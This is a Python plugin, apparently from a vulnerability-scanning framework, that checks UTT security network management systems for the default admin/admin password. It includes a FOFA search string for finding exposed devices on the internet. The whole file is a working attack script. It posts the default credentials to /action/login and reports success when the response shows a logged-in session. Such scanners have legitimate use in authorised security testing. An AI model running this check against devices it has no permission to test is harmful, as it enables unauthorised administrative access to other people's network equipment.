#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '艾泰UTT 安全网络管理系统默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="UTT-安全网络管理系统"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2023/11/28',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/action/login'
  data = 'username=admin&password=admin'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and 'var time=0;' in res.text and 'var leftPwdNums=0;' in res.text:
      ret['huixian'] = data
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret